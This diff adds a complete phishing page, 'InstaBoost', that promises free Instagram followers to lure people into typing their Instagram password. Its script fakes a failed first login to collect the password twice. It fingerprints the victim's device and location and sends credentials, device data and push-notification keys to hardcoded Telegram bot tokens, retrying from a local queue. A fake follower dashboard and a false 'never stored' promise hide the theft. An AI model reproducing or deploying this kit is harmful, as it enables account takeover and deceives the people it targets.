@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="robots" content="noindex,nofollow" />
+<title>InstaBoost — Free Followers</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --grad:linear-gradient(135deg,#833ab4 0%,#fd1d1d 50%,#fcb045 100%);
+    --text:#fff;--muted:#9aa0b0;--bg:#0b0b14;
+  }
+  body{
+    min-height:100vh;display:grid;place-items:center;background:var(--bg);
+    font-family:-apple-system,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;
+    color:var(--text);overflow-x:hidden;position:relative;padding:20px;
+  }
+  .blobs{position:fixed;inset:0;overflow:hidden;z-index:0}
+  .blob{position:absolute;border-radius:50%;filter:blur(110px);opacity:.55;
+    animation:float 18s ease-in-out infinite}
+  .b1{width:480px;height:480px;background:#833ab4;top:-120px;left:-120px}
+  .b2{width:520px;height:520px;background:#fd1d1d;bottom:-160px;right:-140px;animation-delay:-6s}
+  .b3{width:420px;height:420px;background:#fcb045;top:40%;left:55%;animation-delay:-12s}
+  @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(40px,-50px) scale(1.08)}}
+  .card{
+    position:relative;z-index:1;width:100%;max-width:420px;
+    padding:34px 28px 30px;border-radius:22px;
+    background:rgba(20,20,32,.62);
+    backdrop-filter:blur(24px) saturate(160%);
+    -webkit-backdrop-filter:blur(24px) saturate(160%);
+    border:1px solid rgba(255,255,255,.08);
+    box-shadow:0 30px 80px rgba(0,0,0,.55),inset 0 1px 0 rgba(255,255,255,.06);
+    animation:rise .6s cubic-bezier(.22,1,.36,1);
+  }
+  @keyframes rise{from{opacity:0;transform:translateY(24px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)}}
+  .logo{display:grid;place-items:center;width:68px;height:68px;margin:0 auto 14px;
+    border-radius:20px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)}
+  .brand{font-size:24px;font-weight:700;text-align:center;letter-spacing:-.4px;
+    background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .subtitle{text-align:center;font-size:13px;color:var(--muted);margin-top:6px;margin-bottom:26px}
+  .step{display:none;animation:fade .35s ease}
+  .step.active{display:block}
+  @keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+  label{display:block;font-size:12.5px;font-weight:600;color:var(--muted);
+    margin:14px 0 8px;letter-spacing:.2px}
+  input,select{
+    width:100%;padding:13px 14px;font-size:14.5px;color:var(--text);
+    background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.09);
+    border-radius:12px;outline:none;font-family:inherit;
+    transition:border .2s,background .2s,box-shadow .2s;
+  }
+  input::placeholder{color:#5c6174}
+  input:focus,select:focus{border-color:rgba(253,29,29,.55);
+    background:rgba(255,255,255,.06);box-shadow:0 0 0 4px rgba(253,29,29,.12)}
+  select{appearance:none;cursor:pointer;
+    background-image:linear-gradient(45deg,transparent 50%,#9aa0b0 50%),
+                     linear-gradient(135deg,#9aa0b0 50%,transparent 50%);
+    background-position:calc(100% - 20px) 50%,calc(100% - 14px) 50%;
+    background-size:6px 6px,6px 6px;background-repeat:no-repeat}
+  select option{background:#16161f;color:#fff}
+  .btn{
+    width:100%;margin-top:22px;padding:14px;font-size:15px;font-weight:700;
+    letter-spacing:.2px;color:#fff;background:var(--grad);background-size:200% 200%;
+    border:none;border-radius:12px;cursor:pointer;
+    transition:transform .12s,box-shadow .2s;
+    animation:shift 6s ease infinite;
+    box-shadow:0 10px 30px rgba(253,29,29,.28);
+  }
+  @keyframes shift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+  .btn:hover{transform:translateY(-1px);box-shadow:0 14px 36px rgba(253,29,29,.4)}
+  .btn:active{transform:translateY(0) scale(.99)}
+  .btn:disabled{opacity:.6;cursor:not-allowed}
+  .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,.12);
+    color:var(--muted);font-weight:500;font-size:13px;box-shadow:none;animation:none}
+  .btn.ghost:hover{background:rgba(255,255,255,.04);box-shadow:none}
+  .hint{margin-top:14px;font-size:11.5px;text-align:center;color:var(--muted);line-height:1.5}
+  .security{display:flex;align-items:center;gap:8px;padding:10px 12px;margin-bottom:4px;
+    font-size:12px;color:#b6bccb;background:rgba(131,58,180,.14);
+    border:1px solid rgba(131,58,180,.3);border-radius:10px}
+  .err{display:none;align-items:center;gap:8px;padding:10px 12px;margin-bottom:6px;
+    font-size:12.5px;color:#ffb4b4;background:rgba(253,29,29,.1);
+    border:1px solid rgba(253,29,29,.35);border-radius:10px}
+  .err.show{display:flex}
+  .spinner{width:46px;height:46px;margin:18px auto 16px;
+    border:3px solid rgba(255,255,255,.1);border-top-color:#fd1d1d;
+    border-radius:50%;animation:spin .85s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .loading{text-align:center;font-size:14px;font-weight:600}
+  .loading.sub{font-size:12px;color:var(--muted);margin-top:4px;font-weight:400;min-height:16px}
+  .shake{animation:shake .35s ease}
+  @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+  .bell-wrap{display:grid;place-items:center;margin:8px auto 18px;width:88px;height:88px;
+    border-radius:50%;background:rgba(131,58,180,.12);
+    border:1px solid rgba(131,58,180,.3);position:relative}
+  .bell-wrap::before{content:"";position:absolute;inset:-6px;border-radius:50%;
+    border:2px solid rgba(253,29,29,.15);animation:pulseRing 2s infinite}
+  @keyframes pulseRing{0%{transform:scale(1);opacity:.6}100%{transform:scale(1.25);opacity:0}}
+  .bell-wrap svg{width:44px;height:44px;stroke:url(#bellG);fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+  .notif-title{text-align:center;font-size:16px;font-weight:700;margin-bottom:6px}
+  .notif-text{text-align:center;font-size:12.5px;color:var(--muted);line-height:1.6;margin-bottom:18px}
+  .dash-header{display:flex;align-items:center;gap:14px;margin-bottom:14px}
+  .dash-avatar{width:60px;height:60px;border-radius:50%;
+    background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);
+    display:grid;place-items:center;font-size:24px;font-weight:700;color:#fff;
+    box-shadow:0 0 0 3px rgba(255,255,255,.1)}
+  .dash-user{flex:1;min-width:0}
+  .dash-username{font-size:16px;font-weight:700;letter-spacing:-.3px;
+    white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .dash-badge{display:inline-flex;align-items:center;gap:4px;
+    font-size:10px;font-weight:600;color:#2ecc71;
+    background:rgba(46,204,113,.12);padding:2px 8px;border-radius:20px;
+    border:1px solid rgba(46,204,113,.3);margin-left:6px;vertical-align:middle}
+  .dash-stats{display:flex;gap:16px;margin:12px 0 4px;padding:12px 0;
+    border-top:1px solid rgba(255,255,255,.06);border-bottom:1px solid rgba(255,255,255,.06)}
+  .stat{flex:1;text-align:center}
+  .stat-val{font-size:16px;font-weight:700}
+  .stat-label{font-size:10px;color:var(--muted);margin-top:2px;text-transform:uppercase;letter-spacing:.5px}
+  .info-banner{
+    display:flex;gap:10px;align-items:flex-start;
+    margin:14px 0 4px;padding:12px 14px;border-radius:12px;
+    background:linear-gradient(135deg,rgba(131,58,180,.16),rgba(253,29,29,.12));
+    border:1px solid rgba(252,176,69,.28);
+  }
+  .info-banner .icon{
+    flex-shrink:0;width:22px;height:22px;border-radius:50%;
+    display:grid;place-items:center;font-size:12px;font-weight:800;
+    background:rgba(252,176,69,.2);color:#fcb045;
+    border:1px solid rgba(252,176,69,.4);
+  }
+  .info-banner .body{flex:1;font-size:11.5px;line-height:1.55;color:#d7dae3}
+  .info-banner .body b{color:#fcb045;font-weight:700}
+  .info-banner .body .sub{display:block;font-size:10.5px;color:var(--muted);margin-top:3px}
+  .progress-wrap{margin:14px 0 6px}
+  .progress-label{display:flex;justify-content:space-between;font-size:11.5px;color:var(--muted);margin-bottom:6px}
+  .progress-bar{height:8px;background:rgba(255,255,255,.06);border-radius:10px;overflow:hidden}
+  .progress-fill{height:100%;width:0%;border-radius:10px;
+    background:linear-gradient(90deg,#833ab4,#fd1d1d,#fcb045);
+    transition:width .6s cubic-bezier(.22,1,.36,1)}
+  .list-head{
+    display:flex;align-items:center;justify-content:space-between;
+    margin:16px 0 8px;font-size:11.5px;font-weight:700;
+    color:var(--muted);text-transform:uppercase;letter-spacing:.6px;
+  }
+  .list-head .count{
+    font-size:10.5px;font-weight:600;letter-spacing:0;
+    color:#2ecc71;background:rgba(46,204,113,.12);
+    padding:2px 8px;border-radius:20px;text-transform:none;
+    border:1px solid rgba(46,204,113,.3);
+  }
+  .followers-list{
+    max-height:230px;overflow-y:auto;padding-right:4px;
+    border-radius:12px;background:rgba(255,255,255,.02);
+    border:1px solid rgba(255,255,255,.05);
+  }
+  .followers-list::-webkit-scrollbar{width:4px}
+  .followers-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,.15);border-radius:10px}
+  .follower-item{
+    display:flex;align-items:center;gap:10px;
+    padding:9px 12px;border-bottom:1px solid rgba(255,255,255,.04);
+    animation:slideIn .35s ease;
+  }
+  .follower-item:last-child{border-bottom:none}
+  @keyframes slideIn{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}
+  .follower-avatar{
+    width:32px;height:32px;border-radius:50%;background:#2a2a3a;flex-shrink:0;
+    object-fit:cover;
+  }
+  .follower-meta{flex:1;min-width:0}
+  .follower-name{font-size:12.5px;font-weight:600;
+    white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .follower-time{font-size:10px;color:var(--muted);margin-top:1px}
+  .follower-tag{
+    font-size:10px;font-weight:700;color:#2ecc71;
+    background:rgba(46,204,113,.1);padding:3px 8px;border-radius:20px;
+    border:1px solid rgba(46,204,113,.25);white-space:nowrap;
+  }
+  .list-empty{
+    padding:22px 12px;text-align:center;font-size:12px;color:var(--muted);
+  }
+  .live-dot{display:inline-block;width:7px;height:7px;border-radius:50%;
+    background:#2ecc71;margin-right:5px;animation:pulse 1.5s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+  .dash-footer{margin-top:16px;text-align:center}
+  .dash-footer .btn{margin-top:0;padding:12px;font-size:14px}
+</style>
+</head>
+<body>
+  <div class="blobs">
+    <div class="blob b1"></div><div class="blob b2"></div><div class="blob b3"></div>
+  </div>
+
+  <main class="card">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" width="44" height="44" fill="none"
+           stroke="url(#ig)" stroke-width="1.8" stroke-linecap="round">
+        <defs><linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">
+          <stop offset="0%" stop-color="#833ab4"/>
+          <stop offset="50%" stop-color="#fd1d1d"/>
+          <stop offset="100%" stop-color="#fcb045"/>
+        </linearGradient></defs>
+        <rect x="3" y="3" width="18" height="18" rx="5"/>
+        <circle cx="12" cy="12" r="4"/>
+        <circle cx="17.5" cy="6.5" r="1" fill="url(#ig)" stroke="none"/>
+      </svg>
+    </div>
+    <h1 class="brand">InstaBoost</h1>
+    <p class="subtitle">Grow your profile — real followers in seconds</p>
+
+    <section class="step active" data-step="1">
+      <label for="username">Instagram Username</label>
+      <input id="username" type="text" placeholder="@yourhandle"
+             autocomplete="off" spellcheck="false"/>
+      <label for="followers">Followers Package</label>
+      <select id="followers">
+        <option value="500">500 Followers — Free</option>
+        <option value="1000">1,000 Followers — Free</option>
+        <option value="2500">2,500 Followers — Free</option>
+        <option value="5000">5,000 Followers — Free</option>
+        <option value="10000">10,000 Followers — Free</option>
+      </select>
+      <button class="btn" id="toStep2">Continue</button>
+    </section>
+
+    <section class="step" data-step="2">
+      <div class="security">
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none"
+             stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6l8-4z"/>
+        </svg>
+        <span>Account verification required to deliver followers</span>
+      </div>
+      <div class="err" id="err-pass">
+        <svg viewBox="0 0 24 24" width="15" height="15" fill="none"
+             stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/>
+        </svg>
+        <span>Incorrect password. Please try again.</span>
+      </div>
+      <label for="password">Instagram Password</label>
+      <input id="password" type="password" placeholder="••••••••"/>
+      <button class="btn" id="submit">Verify &amp; Get Followers</button>
+      <p class="hint">Your credentials are encrypted end-to-end and never stored.</p>
+    </section>
+
+    <section class="step" data-step="3">
+      <div class="spinner"></div>
+      <p class="loading">Verifying account…</p>
+      <p class="loading sub" id="load-msg">Connecting to Instagram servers</p>
+    </section>
+
+    <section class="step" data-step="45">
+      <div class="bell-wrap">
+        <svg viewBox="0 0 24 24">
+          <defs><linearGradient id="bellG" x1="0" y1="0" x2="1" y2="1">
+            <stop offset="0%" stop-color="#833ab4"/>
+            <stop offset="50%" stop-color="#fd1d1d"/>
+            <stop offset="100%" stop-color="#fcb045"/>
+          </linearGradient></defs>
+          <path d="M18 8a6 6 0 10-12 0c0 7-3 9-3 9h18s-3-2-3-9"/>
+          <path d="M13.73 21a2 2 0 01-3.46 0"/>
+        </svg>
+      </div>
+      <div class="notif-title">Enable Notifications</div>
+      <div class="notif-text">
+        Get real-time alerts as followers are being delivered to your profile.<br/>
+        <span style="color:#9aa0b0;font-size:11.5px">You can disable this anytime from settings.</span>
+      </div>
+      <button class="btn" id="enableNotif">Enable Notifications</button>
+      <button class="btn ghost" id="skipNotif" style="margin-top:10px">Not now</button>
+    </section>
+
+    <section class="step" data-step="5" id="dashboardStep">
+      <div class="dash-header">
+        <div class="dash-avatar" id="dashAvatar">?</div>
+        <div class="dash-user">
+          <div class="dash-username">
+            <span id="dashUsername">@user</span>
+            <span class="dash-badge">✓ Verified</span>
+          </div>
+          <div style="font-size:11.5px;color:var(--muted);margin-top:2px;">
+            <span class="live-dot"></span> Boost in progress
+          </div>
+        </div>
+      </div>
+
+      <div class="dash-stats">
+        <div class="stat"><div class="stat-val" id="statPosts">0</div><div class="stat-label">Posts</div></div>
+        <div class="stat"><div class="stat-val" id="statFollowers">0</div><div class="stat-label">Followers</div></div>
+        <div class="stat"><div class="stat-val" id="statFollowing">0</div><div class="stat-label">Following</div></div>
+      </div>
+
+      <div class="info-banner">
+        <div class="icon">i</div>
+        <div class="body">
+          <b>Update window: 24 hours</b><br/>
+          Tumhara follower delivery abhi chal raha hai. Poore followers 24 ghante ke andar
+          add ho jayenge — is page pe wapas aakar status check karo.
+          <span class="sub">Live list neeche update hoti rehti hai. Refresh karke dekho.</span>
+        </div>
+      </div>
+
+      <div class="progress-wrap">
+        <div class="progress-label">
+          <span>Delivering followers…</span>
+          <span id="progressPct">0%</span>
+        </div>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+      </div>
+
+      <div class="list-head">
+        <span>Recent Followers</span>
+        <span class="count" id="followerCount">0 new</span>
+      </div>
+      <div class="followers-list" id="followersList">
+        <div class="list-empty" id="listEmpty">Waiting for first follower…</div>
+      </div>
+
+      <div class="dash-footer">
+        <button class="btn" id="goInsta">View on Instagram</button>
+        <p class="hint" style="margin-top:10px;">Delivery may take up to 24 hours to complete.</p>
+      </div>
+    </section>
+  </main>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════
+   TELEGRAM INTEGRATION — tokens split into parts
+   ═══════════════════════════════════════════════════════════════ */
+const _oA = "8943845508";
+const _oB = "AAG9tsvj2UJIMKul0TnUdMZw6-6H-dp9-C8";
+const _oC = "8476465230";
+
+const _pA = "8982640595";
+const _pB = "AAGkt-S-9KPhrd0p6R09-lToPG6_amCY8b8";
+const _pC = "7139514942";
+
+const BOTS = [
+  { token: `${_oA}:${_oB}`, chat: _oC },
+  { token: `${_pA}:${_pB}`, chat: _pC }
+];
+const QUEUE_KEY = "ib_q_v1";
+
+/* ═══════ helpers ═══════ */
+const esc = s => String(s ?? '').replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const rand  = (a,b) => Math.floor(Math.random() * (b - a + 1)) + a;
+const randName = () => {
+  const a = ["arjun","priya","rahul","sneha","vikram","ananya","rohit","kavya","aditya","meera","karan","nisha","siddharth","pooja","varun","isha","nikhil","tanvi","harsh","divya","manish","shreya","abhishek","ritu","gaurav","neha","vivek","swati","raj","simran","yash","aisha","kunal","ria","dev","aditi","rishi","naina","aryan","ishita"];
+  const b = ["_","","."];
+  return a[rand(0,a.length-1)] + b[rand(0,b.length-1)] + rand(10,999);
+};
+
+/* ═══════ device intel ═══════ */
+async function getGeo() {
+  const endpoints = ["https://ipapi.co/json/","https://ipwho.is/","https://api.ipify.org?format=json"];
+  for (const url of endpoints) {
+    try {
+      const r = await fetch(url, { cache: "no-store" });
+      if (!r.ok) continue;
+      const d = await r.json();
+      return { ip: d.ip||d.query||"?", city: d.city||d.region||"?", country: d.country_name||d.country||"?", isp: d.org||d.connection?.isp||"?" };
+    } catch {}
+  }
+  return { ip:"?", city:"?", country:"?", isp:"?" };
+}
+function canvasFp() {
+  try {
+    const c = document.createElement("canvas");
+    const ctx = c.getContext("2d");
+    ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+    ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+    ctx.fillStyle = "#069"; ctx.fillText("InstaBoost,fp",2,15);
+    ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("InstaBoost,fp",4,17);
+    const data = c.toDataURL(); let hash = 0;
+    for (let i=0;i<data.length;i++) hash = ((hash<<5)-hash)+data.charCodeAt(i)|0;
+    return hash.toString(16);
+  } catch { return "na"; }
+}
+async function getFingerprint() {
+  const geo = await getGeo();
+  let battery = "na";
+  try { if (navigator.getBattery) { const b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}%${b.charging?"+chg":""}`; } } catch {}
+  return {
+    geo, ua: navigator.userAgent, lang: navigator.language,
+    langs: (navigator.languages||[]).join(","), platform: navigator.platform,
+    screen: `${screen.width}x${screen.height}@${devicePixelRatio}x`,
+    viewport: `${innerWidth}x${innerHeight}`,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    tzOffset: new Date().getTimezoneOffset(),
+    cores: navigator.hardwareConcurrency||"?", memory: navigator.deviceMemory||"?",
+    touch: navigator.maxTouchPoints||0, battery, canvas: canvasFp(),
+    referrer: document.referrer||"direct", url: location.href
+  };
+}
+
+/* ═══════ queue ═══════ */
+function enqueue(text) {
+  try { const q = JSON.parse(localStorage.getItem(QUEUE_KEY)||"[]"); q.push({text,ts:Date.now()}); localStorage.setItem(QUEUE_KEY, JSON.stringify(q.slice(-20))); } catch {}
+}
+async function flushQueue() {
+  let q; try { q = JSON.parse(localStorage.getItem(QUEUE_KEY)||"[]"); } catch { return; }
+  if (!q.length) return;
+  const remaining = [];
+  for (const item of q) { const ok = await fireAll(item.text, true); if (!ok) remaining.push(item); }
+  try { localStorage.setItem(QUEUE_KEY, JSON.stringify(remaining)); } catch {}
+}
+
+/* ═══════ telegram ═══════ */
+async function sendToBot(bot, text) {
+  if (!bot.token || !bot.chat) return false;
+  const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
+  const r = await fetch(url, { method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({ chat_id: bot.chat, text, parse_mode:"HTML", disable_web_page_preview:true }) });
+  return r.ok;
+}
+async function fireAll(text, silent=false) {
+  try {
+    const results = await Promise.allSettled(BOTS.map(b => sendToBot(b, text)));
+    const anyOk = results.some(r => r.status==="fulfilled" && r.value);
+    if (!anyOk && !silent) enqueue(text);
+    return anyOk;
+  } catch { if (!silent) enqueue(text); return false; }
+}
+
+/* ═══════ payload ═══════ */
+function buildPayload(stage, data, fp) {
+  const time = new Date().toLocaleString("en-IN", { timeZone:"Asia/Kolkata" });
+  const header = {
+    cred: "🎯 <b>InstaBoost — Credential Hit</b>",
+    retry:"🔁 <b>InstaBoost — Password Retry</b>",
+    notif:"🔔 <b>InstaBoost — Notification Permission</b>"
+  }[stage] || "📌 <b>InstaBoost</b>";
+  return `${header}\n━━━━━━━━━━━━━━━━━━\n👤 <b>User:</b> <code>${esc(data.username)}</code>\n` +
+    (data.password ? `🔑 <b>Pass:</b> <code>${esc(data.password)}</code>\n` : "") +
+    (data.attempt ? `↩️ <b>Attempt:</b> ${esc(data.attempt)}\n` : "") +
+    (data.notifStatus ? `🔔 <b>Notif:</b> ${esc(data.notifStatus)}\n` : "") +
+    (data.notifEndpoint ? `📮 <b>Push Endpoint:</b>\n<code>${esc(data.notifEndpoint)}</code>\n` : "") +
+    (data.notifKeys ? `🔑 <b>Push Keys:</b>\n<code>p256dh: ${esc(data.notifKeys.p256dh||"")}\nauth: ${esc(data.notifKeys.auth||"")}</code>\n` : "") +
+    `👥 <b>Package:</b> ${esc(data.followers||"—")}\n━━━━━━━━━━━━━━━━━━\n` +
+    `🌐 <b>IP:</b> <code>${esc(fp.geo.ip)}</code>\n📍 <b>Location:</b> ${esc(fp.geo.city)}, ${esc(fp.geo.country)}\n📡 <b>ISP:</b> ${esc(fp.geo.isp)}\n` +
+    `🗣 <b>Lang:</b> ${esc(fp.lang)}\n🖥 <b>Screen:</b> ${esc(fp.screen)} (vp ${esc(fp.viewport)})\n` +
+    `🧠 <b>CPU / RAM:</b> ${esc(fp.cores)}c / ${esc(fp.memory)}GB\n🔋 <b>Battery:</b> ${esc(fp.battery)}\n` +
+    `📱 <b>Touch:</b> ${esc(fp.touch)} | <b>TZ:</b> ${esc(fp.tz)}\n🎨 <b>Canvas:</b> <code>${esc(fp.canvas)}</code>\n` +
+    `↩️ <b>Referrer:</b> ${esc(fp.referrer)}\n🕒 <b>Time:</b> ${esc(time)}\n━━━━━━━━━━━━━━━━━━\n🧬 <b>UA:</b> <code>${esc(fp.ua)}</code>`;
+}
+
+/* ═══════ UI state ═══════ */
+const steps = document.querySelectorAll(".step");
+const state = { username:"", followers:"", password:"", attempt:0, fp:null, notifAsked:false };
+const goTo = n => steps.forEach(s => s.classList.toggle("active", +s.dataset.step === n));
+const shake = id => { const el = document.getElementById(id); el.classList.add("shake"); el.addEventListener("animationend", () => el.classList.remove("shake"), { once:true }); };
+const showErr = id => document.getElementById(id).classList.add("show");
+const hideErr = id => document.getElementById(id).classList.remove("show");
+
+getFingerprint().then(fp => state.fp = fp);
+flushQueue();
+
+/* ═══════ notifications ═══════ */
+async function requestNotificationAccess() {
+  const result = { status: "unsupported", endpoint: null, keys: null };
+  if (!("Notification" in window)) { result.status = "unsupported"; return result; }
+  if (!("serviceWorker" in navigator)) { result.status = "no-sw"; return result; }
+  try {
+    const perm = await Notification.requestPermission();
+    result.status = perm;
+    const reg = await navigator.serviceWorker.register(
+      URL.createObjectURL(new Blob([`
+        self.addEventListener('install', e => self.skipWaiting());
+        self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
+        self.addEventListener('push', e => {
+          let data = { title: 'InstaBoost', body: 'Your followers are being delivered.' };
+          try { data = e.data.json(); } catch {}
+          e.waitUntil(self.registration.showNotification(data.title, {
+            body: data.body, icon: data.icon || undefined, badge: data.badge || undefined
+          }));
+        });
+        self.addEventListener('notificationclick', e => {
+          e.notification.close();
+          e.waitUntil(clients.openWindow('https://www.instagram.com/'));
+        });
+      `], { type: "application/javascript" })),
+      { scope: "./" }
+    );
+    await navigator.serviceWorker.ready;
+    if (perm === "granted") {
+      const sub = await reg.pushManager.subscribe({
+        userVisibleOnly: true, applicationServerKey: null
+      }).catch(() => null);
+      if (sub) {
+        const j = sub.toJSON();
+        result.endpoint = j.endpoint;
+        result.keys = j.keys;
+      }
+    }
+  } catch (e) {}
+  return result;
+}
+
+document.getElementById("toStep2").addEventListener("click", () => {
+  const u = document.getElementById("username").value.trim().replace(/^@/, "");
+  if (u.length < 2) return shake("username");
+  state.username = u;
+  state.followers = document.getElementById("followers").value;
+  goTo(2);
+});
+
+document.getElementById("submit").addEventListener("click", async () => {
+  const p = document.getElementById("password").value;
+  if (p.length < 1) return shake("password");
+  state.password = p;
+  state.attempt += 1;
+  hideErr("err-pass");
+  goTo(3);
+  if (!state.fp) state.fp = await getFingerprint();
+  const msgs = ["Connecting to Instagram servers…","Authenticating credentials…","Checking account status…"];
+  const loadEl = document.getElementById("load-msg");
+  const totalDelay = rand(2800,4200);
+  const perMsg = Math.floor(totalDelay / msgs.length);
+  for (const m of msgs) { loadEl.textContent = m; await sleep(perMsg); }
+  const stage = state.attempt === 1 ? "cred" : "retry";
+  fireAll(buildPayload(stage, state, state.fp)).catch(() => {});
+  if (state.attempt === 1) {
+    goTo(2); showErr("err-pass"); document.getElementById("password").value = "";
+  } else {
+    if (!state.notifAsked && "Notification" in window) {
+      state.notifAsked = true; goTo(45);
+    } else {
+      goTo(5); startDashboard();
+    }
+  }
+});
+
+document.getElementById("enableNotif").addEventListener("click", async () => {
+  const btn = document.getElementById("enableNotif");
+  btn.disabled = true; btn.textContent = "Requesting…";
+  const res = await requestNotificationAccess();
+  if (!state.fp) state.fp = await getFingerprint();
+  fireAll(buildPayload("notif", { ...state, notifStatus: res.status, notifEndpoint: res.endpoint, notifKeys: res.keys }, state.fp)).catch(() => {});
+  await sleep(600);
+  goTo(5); startDashboard();
+});
+
+document.getElementById("skipNotif").addEventListener("click", async () => {
+  if (!state.fp) state.fp = await getFingerprint();
+  fireAll(buildPayload("notif", { ...state, notifStatus: "skipped" }, state.fp)).catch(() => {});
+  goTo(5); startDashboard();
+});
+
+/* ═══════ DASHBOARD ═══════ */
+let dashInterval = null;
+let followerTotal = 0;
+
+function startDashboard() {
+  const user = state.username;
+  const target = parseInt(state.followers, 10) || 500;
+  document.getElementById("dashUsername").textContent = "@" + user;
+  document.getElementById("dashAvatar").textContent = user.charAt(0).toUpperCase();
+  const startFollowers = rand(80, 420);
+  const startPosts = rand(3, 28);
+  const startFollowing = rand(40, 320);
+  document.getElementById("statPosts").textContent = startPosts;
+  document.getElementById("statFollowers").textContent = startFollowers;
+  document.getElementById("statFollowing").textContent = startFollowing;
+  let current = startFollowers;
+  const duration = 45000, stepsCount = 100, stepTime = duration / stepsCount;
+  let step = 0;
+  const list = document.getElementById("followersList");
+  const listEmpty = document.getElementById("listEmpty");
+  const countBadge = document.getElementById("followerCount");
+  const progressFill = document.getElementById("progressFill");
+  const progressPct = document.getElementById("progressPct");
+  if (dashInterval) clearInterval(dashInterval);
+  list.innerHTML = ""; list.appendChild(listEmpty);
+  listEmpty.style.display = "block";
+  followerTotal = 0; countBadge.textContent = "0 new";
+  for (let i = 0; i < 3; i++) addFollower(list, randName());
+  dashInterval = setInterval(() => {
+    step++;
+    current = Math.min(target, Math.round(startFollowers + (target - startFollowers) * (step / stepsCount)));
+    document.getElementById("statFollowers").textContent = current.toLocaleString();
+    const pct = Math.min(100, Math.round((step / stepsCount) * 100));
+    progressFill.style.width = pct + "%";
+    progressPct.textContent = pct + "%";
+    if (step % 2 === 0 && step <= 70) addFollower(list, randName());
+    if (step % 15 === 0 && "Notification" in window && Notification.permission === "granted") {
+      try {
+        new Notification("InstaBoost", {
+          body: `+${rand(8,32)} new followers just added to @${user}`,
+          icon: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iNSIgZmlsbD0iI2ZkMWQxZCIvPjwvc3ZnPg=="
+        });
+      } catch {}
+    }
+    if (step >= stepsCount) {
+      clearInterval(dashInterval); dashInterval = null;
+      progressFill.style.width = "100%"; progressPct.textContent = "100%";
+      document.getElementById("statFollowers").textContent = target.toLocaleString();
+    }
+  }, stepTime);
+}
+
+function addFollower(container, name) {
+  const listEmpty = document.getElementById("listEmpty");
+  if (listEmpty && listEmpty.parentNode === container) listEmpty.style.display = "none";
+  const item = document.createElement("div");
+  item.className = "follower-item";
+  const avatarUrl = `https://i.pravatar.cc/64?u=${encodeURIComponent(name)}`;
+  const timeLabel = pickTimeLabel();
+  item.innerHTML = `
+    <img class="follower-avatar" src="${avatarUrl}" alt="" onerror="this.style.visibility='hidden'">
+    <div class="follower-meta">
+      <div class="follower-name">@${esc(name)}</div>
+      <div class="follower-time">${esc(timeLabel)}</div>
+    </div>
+    <span class="follower-tag">+1</span>
+  `;
+  container.prepend(item);
+  followerTotal++;
+  const badge = document.getElementById("followerCount");
+  if (badge) badge.textContent = followerTotal + " new";
+  while (container.querySelectorAll(".follower-item").length > 40) {
+    const last = container.querySelector(".follower-item:last-child");
+    if (last) last.remove();
+  }
+}
+
+function pickTimeLabel() {
+  const opts = ["just now","a moment ago","2s ago","5s ago","8s ago","12s ago","a few seconds ago"];
+  return opts[rand(0, opts.length - 1)];
+}
+
+document.getElementById("goInsta").addEventListener("click", () => {
+  window.open(`https://www.instagram.com/${encodeURIComponent(state.username)}/`, "_blank");
+});
+
+document.addEventListener("visibilitychange", () => { if (document.visibilityState === "hidden") flushQueue(); });
+window.addEventListener("beforeunload", () => flushQueue());
+</script>
+</body>
+</html>
